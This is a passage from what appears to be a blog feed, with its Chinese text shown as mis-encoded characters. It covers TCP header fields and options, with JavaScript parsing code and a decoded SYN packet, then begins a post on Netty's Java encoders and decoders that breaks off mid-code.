ä¸ºç°åœ¨çš„TCPæ¥æ”¶æ•°æ®ç¼“å†²åŒºï¼ˆæ¥æ”¶çª—å£ï¼‰çš„é•¿åº¦é€šå¸¸å¤§äº65535å­—èŠ‚ã€‚</p></li><li><p>4ï¼šsackOKâ€”å‘é€ç«¯æ”¯æŒå¹¶åŒæ„ä½¿ç”¨SACKé€‰é¡¹ã€‚</p></li><li><p>5ï¼šSACKå®é™…å·¥ä½œçš„é€‰é¡¹ã€‚</p></li><li><p>8ï¼šæ—¶é—´æˆ³ï¼ˆ10å­—èŠ‚ï¼ŒTCP Timestamps Optionï¼ŒTSoptï¼‰</p><ul><li>å‘é€ç«¯çš„æ—¶é—´æˆ³ï¼ˆTimestamp Value fieldï¼ŒTSvalï¼Œ4å­—èŠ‚ï¼‰</li><li>æ—¶é—´æˆ³å›æ˜¾åº”ç­”ï¼ˆTimestamp Echo Reply fieldï¼ŒTSecrï¼Œ4å­—èŠ‚ï¼‰</li></ul></li></ul>  <figure class="highlight js"><figcaption><span>parse_tcp_header_options.js</span><a href="/downloads/code/parse_tcp_header_options.js">view raw</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">parseTCPHeader</span>(<span class="params">header</span>) {</span><br><span class="line">    <span class="keyword">if</span> (header.<span class="property">length</span> &lt; <span class="number">20</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Bad Frame&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> _readerIndex = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> sourcePort = header.<span class="title function_">readUInt16BE</span>(_readerIndex);</span><br><span class="line">    _readerIndex += <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">let</span> destinationPort = header.<span class="title function_">readUInt16BE</span>(_readerIndex);</span><br><span class="line">    _readerIndex += <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">let</span> sequenceNumber = header.<span class="title function_">readUInt32BE</span>(_readerIndex);</span><br><span class="line">    _readerIndex += <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">let</span> acknowledgmentNumber = header.<span class="title function_">readUInt32BE</span>(_readerIndex);</span><br><span class="line">    _readerIndex += <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> dataOffsetAndFlags = header.<span class="title function_">readUInt16BE</span>(_readerIndex);</span><br><span class="line">    _readerIndex += <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">let</span> dataOffset = dataOffsetAndFlags &gt;&gt; <span class="number">12</span>;</span><br><span class="line">    <span class="keyword">let</span> headerLength = dataOffset * <span class="number">4</span>; <span class="comment">// 4 bytes 32 bits</span></span><br><span class="line">    <span class="keyword">let</span> urg = dataOffsetAndFlags &gt;&gt; <span class="number">5</span> &amp; <span class="number">0x01</span>;</span><br><span class="line">    <span class="keyword">let</span> ack = dataOffsetAndFlags &gt;&gt; <span class="number">4</span> &amp; <span class="number">0x01</span>;</span><br><span class="line">    <span class="keyword">let</span> psh = dataOffsetAndFlags &gt;&gt; <span class="number">3</span> &amp; <span class="number">0x01</span>;</span><br><span class="line">    <span class="keyword">let</span> rst = dataOffsetAndFlags &gt;&gt; <span class="number">2</span> &amp; <span class="number">0x01</span>;</span><br><span class="line">    <span class="keyword">let</span> syn = dataOffsetAndFlags &gt;&gt; <span class="number">1</span> &amp; <span class="number">0x01</span>;</span><br><span class="line">    <span class="keyword">let</span> fin = dataOffsetAndFlags &amp; <span class="number">0x01</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable language_">window</span> = header.<span class="title function_">readUInt16BE</span>(_readerIndex);</span><br><span class="line">    _readerIndex += <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">let</span> checksum = header.<span class="title function_">readUInt16BE</span>(_readerIndex);</span><br><span class="line">    _readerIndex += <span class="number">2</span>;</span><br><span class="line">    urgentPointer = header.<span class="title function_">readUInt16BE</span>(_readerIndex);</span><br><span class="line">    _readerIndex += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> options;</span><br><span class="line">    <span class="keyword">if</span> (headerLength &gt; <span class="number">20</span>) options = <span class="title function_">parseTCPOptions</span>(header.<span class="title function_">slice</span>(_readerIndex)); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> {</span><br><span class="line">        sourcePort,</span><br><span class="line">        destinationPort,</span><br><span class="line">        sequenceNumber,</span><br><span class="line">        acknowledgmentNumber,</span><br><span class="line">        dataOffset,</span><br><span class="line">        urg,</span><br><span class="line">        ack,</span><br><span class="line">        psh,</span><br><span class="line">        rst,</span><br><span class="line">        syn,</span><br><span class="line">        fin,</span><br><span class="line">        <span class="variable language_">window</span>,</span><br><span class="line">        checksum,</span><br><span class="line">        urgentPointer,</span><br><span class="line">        options</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></li></ul><p>ç¤ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000   d2 e6 00 50 f5 e9 1f 49 00 00 00 00 b0 02 ff ff</span><br><span class="line">0010   5a 79 00 00 02 04 05 b4 01 03 03 05 01 01 08 0a</span><br><span class="line">0020   ba 87 34 a1 00 00 00 00 04 02 00 00</span><br></pre></td></tr></table></figure><p>ä¸Šå›¾ä¸­<code>Source Port</code>ä¸º<code>0xd2e6</code>å¯¹åº”åè¿›åˆ¶ä¸º<code>53990</code>ï¼Œ<code>Destination Port</code>ä¸º<code>0x0050</code>åè¿›åˆ¶ä¸º<code>80</code>ã€‚<code>Sequence Number</code>ä¸º<code>0xf5ef1f49</code>å¯¹åº”åè¿›åˆ¶ä¸º<code>4126089033</code>ï¼Œ<code>Acknowledgment Number</code>ä¸º<code>0x000000</code>ã€‚<code>Data Offset</code>ã€<code>Reserved</code>åŠ<code>Control Bits</code>åˆå¹¶ä¸º<code>0xb002</code>ï¼Œå¯¹åº”äºŒè¿›åˆ¶<code>1011000000000010</code>å…¶ä¸­<code>Data Offset</code>ä¸º<code>1011</code>åˆ™å¤´éƒ¨é•¿åº¦ä¸º44 bytesï¼Œ<code>Control Bits</code>ä¸º<code>000010</code>å¯¹ç…§ä¸º<code>SYN</code>ç±»å‹ã€‚<code>Window</code>ä¸º<code>0xffff</code>ã€‚<code>Checksum</code>ä¸ºä¸º<code>0x5a79</code>ã€‚<code>Urgent Pointer</code>ä¸º<code>0x0000</code>ã€‚<code>Options</code>ä¸º<code>020405b4010303050101080aba8734a10000000004020000</code>è§£æå‡ºæ¥ä¸º<code>&quot;mss&quot;:1460,&quot;wscale&quot;:5,&quot;sackOK&quot;:true,&quot;tsVal&quot;:3129423009,&quot;tsEcr&quot;:0</code>ã€‚</p><blockquote><p>TCP åŒ…çš„é•¿åº¦æœ‰ MTU ç¡®å®šï¼Œåœ¨ä»¥å¤ªç½‘ä¸­ä¸€èˆ¬æ˜¯ 1500 bytesã€‚MTU æ˜¯åŒ…å«å¤´éƒ¨ï¼ˆTCPå¤´éƒ¨ã€IPå¤´éƒ¨ï¼‰çš„æ€»é•¿åº¦ï¼Œå› æ­¤éœ€è¦ä» MTU å‡å»å¤´éƒ¨çš„é•¿åº¦ï¼Œç„¶åå¾—åˆ°çš„é•¿åº¦å°±æ˜¯ä¸€ä¸ªç½‘ç»œåŒ…ä¸­æ‰€èƒ½å®¹çº³çš„æœ€å¤§æ•°æ®é•¿åº¦ï¼Œè¿™ä¸€é•¿åº¦å«ä½œ MSSã€‚</p></blockquote><table><thead><tr><th>No.</th><th>æœåŠ¡å™¨:80</th><th>æµå‘</th><th>å®¢æˆ·ç«¯:53990</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><strong>TCP è¿æ¥</strong></td><td></td><td></td><td></td><td></td></tr><tr><td>399</td><td></td><td>&lt;â€“</td><td>SYN:4125695817 SN:4125695817 Window:65535</td><td>[è¿æ¥] å®¢æˆ·ç«¯å‘èµ·ï¼Œåˆå§‹SNä¸º4125695817</td></tr><tr><td>400</td><td>ACK:4125695818,SYN:787209242 SN:787209242 Window:14480</td><td>â€“&gt;</td><td></td><td>[è¿æ¥] æœåŠ¡å™¨ACKå¹¶å‘é€åˆå§‹SNä¸º787209242</td></tr><tr><td>401</td><td></td><td>&lt;â€“</td><td>ACK:787209243 SN:4125695818 Window:4117</td><td>[è¿æ¥] å®¢æˆ·ç«¯ACK æ›´æ–°çª—å£ä¸º4117</td></tr><tr><td><strong>HTTP è¯·æ±‚</strong></td><td></td><td></td><td></td><td></td></tr><tr><td>402</td><td></td><td>&lt;â€“</td><td>ACK:787209243,PSH SN:4125695818 Window:4117</td><td>[æ”¶å‘] å®¢æˆ·ç«¯å‘é€HTTPè¯·æ±‚æ•°æ®</td></tr><tr><td>403</td><td>ACK:4125695894 SN:787209243 Window:227</td><td>â€“&gt;</td><td></td><td>[æ”¶å‘] æœåŠ¡å™¨ACKå®¢æˆ·ç«¯è¯·æ±‚æ•°æ®</td></tr><tr><td><strong>HTTP å“åº”</strong></td><td></td><td></td><td></td><td></td></tr><tr><td>404</td><td>ACK:4125695894 SN:787209243 Window:227</td><td>â€“&gt;</td><td></td><td>[æ”¶å‘] æœåŠ¡å™¨ç«¯å‘é€æ•°æ®</td></tr><tr><td>405</td><td>ACK:4125695894 SN:787210691 Window:227</td><td>â€“&gt;</td><td></td><td>[æ”¶å‘] æœåŠ¡å™¨ç«¯å‘é€æ•°æ®</td></tr><tr><td>406</td><td>ACK:4125695894,PSH SN:787212139 Window:227</td><td>â€“&gt;</td><td></td><td>[æ”¶å‘] æœåŠ¡å™¨ç«¯å‘é€æ•°æ®</td></tr><tr><td>407</td><td></td><td>&lt;â€“</td><td>ACK:787212139 SN:4125695894 Window:4050</td><td>[æ”¶å‘] å®¢æˆ·ç«¯ç¡®è®¤</td></tr><tr><td>408</td><td></td><td>&lt;â€“</td><td>ACK:787213379 SN:4125695894 Window:4012</td><td>[æ”¶å‘] æ›´æ–°çª—å£</td></tr><tr><td><strong>TCP å…³é—­</strong></td><td></td><td></td><td></td><td></td></tr><tr><td>409</td><td></td><td>&lt;â€“</td><td>ACK:787213379,FIN SN:4125695894 Window:4096</td><td></td></tr><tr><td>411</td><td>ACK:4125695895,FIN SN:787213379 Window:227</td><td>â€“&gt;</td><td></td><td>è¿™æ­¥æ˜¯ä¸€ä¸ªåˆå¹¶æ“ä½œï¼Œæ•ˆæœç­‰åŒäºå››æ¬¡æ¡æ‰‹</td></tr><tr><td>412</td><td></td><td>&lt;â€“</td><td>ACK:787213380 SN:4125695895 Window:4096</td><td></td></tr></tbody></table><p>è§£æTCPå¤´éƒ¨ä»£ç </p><figure class="highlight js"><figcaption><span>parse_tcp_header.js</span><a href="/downloads/code/parse_tcp_header.js">view raw</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">parseTCPHeader</span>(<span class="params">header</span>) {</span><br><span class="line">    <span class="keyword">if</span> (header.<span class="property">length</span> &lt; <span class="number">20</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Bad Frame&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> _readerIndex = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> sourcePort = header.<span class="title function_">readUInt16BE</span>(_readerIndex);</span><br><span class="line">    _readerIndex += <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">let</span> destinationPort = header.<span class="title function_">readUInt16BE</span>(_readerIndex);</span><br><span class="line">    _readerIndex += <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">let</span> sequenceNumber = header.<span class="title function_">readUInt32BE</span>(_readerIndex);</span><br><span class="line">    _readerIndex += <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">let</span> acknowledgmentNumber = header.<span class="title function_">readUInt32BE</span>(_readerIndex);</span><br><span class="line">    _readerIndex += <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> dataOffsetAndFlags = header.<span class="title function_">readUInt16BE</span>(_readerIndex);</span><br><span class="line">    _readerIndex += <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">let</span> dataOffset = dataOffsetAndFlags &gt;&gt; <span class="number">12</span>;</span><br><span class="line">    <span class="keyword">let</span> headerLength = dataOffset * <span class="number">4</span>; <span class="comment">// 4 bytes 32 bits</span></span><br><span class="line">    <span class="keyword">let</span> urg = dataOffsetAndFlags &gt;&gt; <span class="number">5</span> &amp; <span class="number">0x01</span>;</span><br><span class="line">    <span class="keyword">let</span> ack = dataOffsetAndFlags &gt;&gt; <span class="number">4</span> &amp; <span class="number">0x01</span>;</span><br><span class="line">    <span class="keyword">let</span> psh = dataOffsetAndFlags &gt;&gt; <span class="number">3</span> &amp; <span class="number">0x01</span>;</span><br><span class="line">    <span class="keyword">let</span> rst = dataOffsetAndFlags &gt;&gt; <span class="number">2</span> &amp; <span class="number">0x01</span>;</span><br><span class="line">    <span class="keyword">let</span> syn = dataOffsetAndFlags &gt;&gt; <span class="number">1</span> &amp; <span class="number">0x01</span>;</span><br><span class="line">    <span class="keyword">let</span> fin = dataOffsetAndFlags &amp; <span class="number">0x01</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable language_">window</span> = header.<span class="title function_">readUInt16BE</span>(_readerIndex);</span><br><span class="line">    _readerIndex += <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">let</span> checksum = header.<span class="title function_">readUInt16BE</span>(_readerIndex);</span><br><span class="line">    _readerIndex += <span class="number">2</span>;</span><br><span class="line">    urgentPointer = header.<span class="title function_">readUInt16BE</span>(_readerIndex);</span><br><span class="line">    _readerIndex += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> options;</span><br><span class="line">    <span class="keyword">if</span> (headerLength &gt; <span class="number">20</span>) options = <span class="title function_">parseTCPOptions</span>(header.<span class="title function_">slice</span>(_readerIndex)); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> {</span><br><span class="line">        sourcePort,</span><br><span class="line">        destinationPort,</span><br><span class="line">        sequenceNumber,</span><br><span class="line">        acknowledgmentNumber,</span><br><span class="line">        dataOffset,</span><br><span class="line">        urg,</span><br><span class="line">        ack,</span><br><span class="line">        psh,</span><br><span class="line">        rst,</span><br><span class="line">        syn,</span><br><span class="line">        fin,</span><br><span class="line">        <span class="variable language_">window</span>,</span><br><span class="line">        checksum,</span><br><span class="line">        urgentPointer,</span><br><span class="line">        options</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://tools.ietf.org/html/rfc793#section-3.1">TRANSMISSION CONTROL PROTOCOL</a></li><li><a href="https://book.douban.com/subject/26941639/">ç½‘ç»œæ˜¯æ€ä¹ˆè¿æ¥çš„</a></li><li><a href="https://book.douban.com/subject/1088054/">TCP&#x2F;IPè¯¦è§£ å·1ï¼šåè®®</a></li><li><a href="https://book.douban.com/subject/1683696/">TCP&#x2F;IPç½‘ç»œä¸åè®®ï¼ˆç¬¬äºŒç‰ˆï¼‰</a></li><li><a href="https://www.zhihu.com/question/21524257">ä¸ºä»€ä¹ˆæ ‡å‡†ä»¥å¤ªç½‘æ¥å£ç¼ºçœçš„MTUä¸º1500ï¼Ÿ</a></li><li><a href="https://community.emc.com/message/842879#842879">ç»†è¯´TCPç¡®è®¤æœºåˆ¶</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> tcp </tag>
            
            <tag> ip </tag>
            
            <tag> mac </tag>
            
            <tag> arp </tag>
            
            <tag> icmp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nettyç¼–è§£ç å™¨</title>
      <link href="/post/netty-codec.html"/>
      <url>/post/netty-codec.html</url>
      
        <content type="html"><![CDATA[<h2 id="Nettyç¼–è§£ç å™¨"><a href="#Nettyç¼–è§£ç å™¨" class="headerlink" title="Nettyç¼–è§£ç å™¨"></a>Nettyç¼–è§£ç å™¨</h2><p>ç¼–ç å’Œè§£ç ï¼Œæˆ–è€…æ•°æ®ä»ä¸€ç§ç‰¹å®šåè®®çš„æ ¼å¼åˆ°å¦ä¸€ç§æ ¼å¼çš„è½¬æ¢ã€‚è¿™äº›ä»»åŠ¡å°†ç”±é€šå¸¸ç§°ä¸ºç¼–è§£ç å™¨çš„ç»„ä»¶æ¥å¤„ç†ã€‚æ¯ä¸ªç½‘ç»œåº”ç”¨ç¨‹åºéƒ½å¿…é¡»å®šä¹‰å¦‚ä½•è§£æåœ¨ä¸¤ä¸ªèŠ‚ç‚¹ä¹‹é—´æ¥å›ä¼ è¾“çš„åŸå§‹å­—èŠ‚ï¼Œä»¥åŠå¦‚ä½•å°†å…¶å’Œç›®æ ‡åº”ç”¨ç¨‹åºçš„æ•°æ®æ ¼å¼åšç›¸äº’è½¬æ¢ã€‚</p><p>ä¾‹å¦‚<a href="websocket.html">WebSocket</a>æœåŠ¡ï¼ŒWebSocketæœåŠ¡å™¨æ”¶åˆ°æ˜¯å­—èŠ‚æµï¼Œæˆ‘ä»¬æ”¶åˆ°å­—èŠ‚æµåè¦å°†å…¶è§£ç æˆWebSocketæ¶ˆæ¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> 0                   1                   2                   3</span><br><span class="line"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="line">+-+-+-+-+-------+-+-------------+-------------------------------+</span><br><span class="line">|F|R|R|R| opcode|M| Payload len |    Extended payload length    |</span><br><span class="line">|I|S|S|S|  (4)  |A|     (7)     |             (16/64)           |</span><br><span class="line">|N|V|V|V|       |S|             |   (if payload len==126/127)   |</span><br><span class="line">| |1|2|3|       |K|             |                               |</span><br><span class="line">+-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +</span><br><span class="line">|     Extended payload length continued, if payload len == 127  |</span><br><span class="line">+ - - - - - - - - - - - - - - - +-------------------------------+</span><br><span class="line">|                               |Masking-key, if MASK set to 1  |</span><br><span class="line">+-------------------------------+-------------------------------+</span><br><span class="line">| Masking-key (continued)       |          Payload Data         |</span><br><span class="line">+-------------------------------- - - - - - - - - - - - - - - - +</span><br><span class="line">:                     Payload Data continued ...                :</span><br><span class="line">+ - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +</span><br><span class="line">|                     Payload Data continued ...                |</span><br><span class="line">+---------------------------------------------------------------+</span><br></pre></td></tr></table></figure><p>ç¼–ç å™¨æ˜¯å°†æ¶ˆæ¯è½¬æ¢ä¸ºé€‚åˆäºä¼ è¾“çš„æ ¼å¼ï¼ˆæœ€æœ‰å¯èƒ½çš„å°±æ˜¯å­—èŠ‚æµï¼‰ï¼›è€Œå¯¹åº”çš„è§£ç å™¨åˆ™æ˜¯å°†ç½‘ç»œå­—èŠ‚æµè½¬æ¢å›åº”ç”¨ç¨‹åºçš„æ¶ˆæ¯æ ¼å¼ã€‚ç¼–ç å™¨æ“ä½œå‡ºç«™æ•°æ®ï¼Œè€Œè§£ç å™¨å¤„ç†å…¥ç«™æ•°æ®ã€‚</p><p><img src="/images/channelhandler.png" alt="ChannelHandler"></p><h3 id="è§£ç å™¨"><a href="#è§£ç å™¨" class="headerlink" title="è§£ç å™¨"></a>è§£ç å™¨</h3><p>å› ä¸ºè§£ç å™¨æ˜¯è´Ÿè´£å°†å…¥ç«™æ•°æ®ä»ä¸€ç§æ ¼å¼è½¬æ¢åˆ°å¦ä¸€ç§æ ¼å¼çš„ï¼Œæ‰€ä»¥Nettyçš„è§£ç å™¨éƒ½å®ç°äº†<code>ChannelInboundHandler</code>ã€‚</p><p>Nettyæä¾›ä¸‹é¢ä¸¤ä¸ªä¸åŒç”¨å¤„çš„è§£ç å™¨ï¼š</p><ul><li><p>å°†å­—èŠ‚è½¬è§£ç ä¸ºæ¶ˆæ¯ â€“ ByteToMessageDecoder å’Œ ReplayingDecoder</p><p>  <code>ByteToMessageDecoder</code>æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œæˆ‘ä»¬éœ€è¦å®ç°å…¶<code>decode</code>æ–¹æ³•ã€‚</p><p>  ç”±äºä½ ä¸å¯èƒ½çŸ¥é“è¿œç¨‹èŠ‚ç‚¹æ˜¯å¦ä¼šä¸€æ¬¡æ€§åœ°å‘é€ä¸€ä¸ªå®Œæ•´çš„æ¶ˆæ¯ï¼Œæ‰€ä»¥è¿™ä¸ªç±»ä¼šå¯¹å…¥ç«™æ•°æ®è¿›è¡Œç¼“å†²ï¼Œç›´åˆ°æœ‰è¶³å¤Ÿçš„æ•°æ®å‡†å¤‡å¥½å¤„ç†ã€‚</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ToIntegerDecoder</span> <span class="keyword">extends</span> <span class="title class_">ByteToMessageDecoder</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">decode</span><span class="params">(ChannelHandlerContext ctx, ByteBuf in, List&lt;Object&gt; out)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (in.readableBytes() &gt;= <span class="number">4</span>) out.add(in.readInt());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬è¦æ‰‹åŠ¨åˆ¤æ–­è¾“å…¥çš„ByteBufæ˜¯å¦å…·æœ‰è¶³å¤Ÿçš„æ•°æ®æœ‰ç‚¹ç¹çã€‚ä¸‹é¢æˆ‘ä»¬ä½¿ç”¨<code>ReplayingDecode</code>ï¼Œå®ƒå¯ä»¥è®©æˆ‘ä»¬ä¸å¿…é‡å¤åšè¿™ä¸ªäº‹æƒ…ã€‚</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ToIntegerDecoder</span> <span class="keyword">extends</span> <span class="title class_">ReplayingDecoder</span>&lt;Integer&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">decode</span><span class="params">(ChannelHandlerContext ctx, ByteBuf in, List&lt;Object&gt; out)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        out.add(in.readInt());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  ä½¿ç”¨ReplayingDecoderæ—¶ä¼šç¨æ…¢äºByteToMessageDecoderã€‚</p></li><li><p>å°†ä¸€ç§æ¶ˆæ¯è§£ç ä¸ºå¦ä¸€ç§æ¶ˆæ¯ â€“ MessageToMessageDecoder</p><p>  ä¸‹é¢ä¾‹å­ä¸­è®²Integerç±»å‹çš„æ¶ˆæ¯è½¬æ¢æˆStringç±»å‹ï¼Œç„¶åä¼ é€’ç»™ä¸‹ä¸€ä¸ªhandlerã€‚</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IntegerToStringDecoder</span> <span class="keyword">extends</span> <span class="title class_">MessageToMessageDecoder</span>&lt;Integer&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">decode</span><span class="params">(ChannelHandlerContext ctx, Integer msg, List&lt;Object&gt; out)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        out.add(String.valueOf(msg));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><blockquote><p>æ³¨æ„ï¼šæ¯æ¬¡è°ƒç”¨<code>decode</code>æ–¹æ³•åå³æ²¡æ–°messageäº§ç”Ÿç¼“å†²åŒºä¹Ÿæ— å˜åŒ–ï¼Œç¼“å­˜åŒºæ•°æ®å°†åœ¨ä¸‹ä¸€è½®<code>channelRead</code>äº‹ä»¶è§¦å‘åå¤„ç†ã€‚åŸå› ä¹Ÿå¾ˆå¥½ç†è§£ï¼Œå¦‚æœä¸€æ¬¡<code>decoder</code>åæ²¡æ–°messageäº§ç”Ÿä¹Ÿæ²¡ç¼“å­˜æ¶ˆè€—ï¼Œå†æ‰§è¡Œä¸€æ¬¡<code>decoder</code>å°†è¿˜æ˜¯åŒæ ·çš„ç»“æœï¼ˆæ‰€æœ‰æ¡ä»¶éƒ½æ²¡å˜åŒ–ï¼‰ï¼Œå¤„ç†ä¸å¥½è¿™ä¼šé€ æˆæ­»å¾ªç¯ã€‚<a href="https://github.com/netty/netty/blob/4.1/codec/src/main/java/io/netty/handler/codec/ByteToMessageDecoder.java#L438">ä»£ç 32è¡Œ</a></p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> 